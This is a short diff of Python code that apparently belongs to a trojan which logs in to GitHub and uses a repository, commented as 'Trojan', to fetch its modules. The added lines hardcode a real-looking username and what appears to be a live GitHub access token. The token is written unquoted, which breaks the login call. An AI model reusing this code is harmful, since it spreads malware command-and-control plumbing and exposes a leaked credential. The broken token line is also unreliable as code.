@@ -13,8 +13,8 @@ def github_connect():
     # Read the token from 'secret.txt'
     with open('secret.txt') as f:
         token = f.read().strip()
-    user = 'yourusername'  # GitHub username
-    sess = github3.login(token=token)  # Login to GitHub using the token
+    user = 'RealIrox100'  # GitHub username
+    sess = github3.login(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)  # Login to GitHub using the token
     return sess.repository(user, 'nameofyourrepo')  # Return the specific repository 'Trojan'
 # Function to retrieve the contents of a file from a specific directory in the GitHub repository
 def get_file_contents(dirname, module_name, repo):
